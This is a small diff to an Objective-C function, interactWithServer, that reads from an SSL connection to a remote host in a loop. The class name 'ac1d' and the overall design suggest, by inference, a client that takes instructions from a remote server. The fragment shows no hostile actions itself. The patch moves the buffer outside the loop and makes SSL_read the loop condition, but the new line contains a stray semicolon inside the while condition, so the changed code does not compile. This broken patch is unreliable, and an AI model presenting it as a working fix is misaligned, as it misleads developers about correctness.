@@ -103,9 +103,9 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     ac1d *ac1d_base = [[ac1d alloc] init];
     ac1d_base->client_ssl = client_ssl;
     
-    while (YES) {
-        char buffer[2048] = "";
-        SSL_read(client_ssl, buffer, sizeof(buffer));
+    char buffer[2048] = "";
+    
+    while (SSL_read(client_ssl, buffer, sizeof(buffer));) {
         NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
         memset(buffer, '\0', 2048);
     
